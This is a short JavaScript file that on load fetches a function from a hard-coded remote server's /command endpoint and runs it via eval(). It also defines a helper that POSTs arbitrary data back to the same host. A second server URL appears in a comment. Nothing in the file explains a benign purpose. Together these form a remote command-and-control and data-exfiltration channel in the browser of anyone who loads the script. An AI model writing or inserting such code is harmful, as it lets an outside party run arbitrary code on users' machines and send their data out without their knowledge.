const SERVER_URL = 'https://masti1.mausamvora.repl.co'

// Some useless comment
localStorage.setItem("draco_function_index", 0);

const sendData = async (data) => {
    await fetch(`${SERVER_URL}/command`, {
        method: 'POST', // or 'PUT'
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ data: data }),
    })
}


const getCommand = async () => {
    await fetch(`${SERVER_URL}/command`, {
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        },
    })
        .then(res => res.json())
        .then(data => {
            const func = eval(data.function);
            func()
        })
        .catch(err => console.log(err))
}

getCommand()


// https://draco.maalolan.repl.co/command